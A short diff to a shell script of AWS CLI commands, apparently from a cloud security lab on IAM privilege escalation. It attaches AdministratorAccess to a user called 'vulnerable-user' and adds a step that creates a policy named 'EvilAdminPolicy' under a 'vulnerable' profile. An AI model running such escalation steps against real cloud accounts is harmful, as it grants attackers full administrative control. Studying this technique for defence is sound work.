@@ -4,3 +4,8 @@ aws iam attach-user-policy \
   --user-name vulnerable-user \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
   --profile vulnerable
+
+aws iam create-policy \
+  --policy-name EvilAdminPolicy \
+  --policy-document file://admin.json \
+  --profile vulnerable
